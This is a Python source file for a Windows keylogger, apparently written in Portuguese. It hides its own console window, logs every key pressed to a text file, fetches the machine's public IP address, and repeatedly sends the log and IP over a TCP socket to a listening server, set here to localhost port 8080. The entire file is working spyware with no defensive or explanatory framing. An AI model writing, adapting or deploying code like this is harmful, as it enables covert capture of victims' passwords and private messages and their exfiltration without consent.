
from pynput.keyboard import Listener
import os
import subprocess
import threading
import win32gui
import win32con
from http import client
import socket
from multiprocessing import connection
import requests

hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_info = response.json()
    return ip_info['ip']


def update_dados():
    while True:
        ip_public = get_public_ip()

        try:
            nexus = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            nexus.connect(('localhost', 8080))



            namefile = "log.txt"

            with open(namefile,"rb") as file:
                for data in file.readlines():
                    nexus.send(data)
            ip_public = ";" + ip_public
            nexus.send(ip_public.encode())
            nexus.send(b";END_OF_FILE")
        except Exception as e:
            print(e)        
        

thread_update = threading.Thread(target=update_dados)
thread_update.start()

def log(teclado):

    with open('log.txt','a') as arq_log:
        
        if str(teclado) != 'Key.space' and str(teclado) != 'Key.enter' :   
            arq_log.write(str(teclado))
        elif str(teclado) == 'Key.space':
            arq_log.write("  ")
        elif str(teclado) == 'Key.enter':
            arq_log.write("\n")
        
       

with Listener(on_press=log) as monitor:
   monitor.join()

   



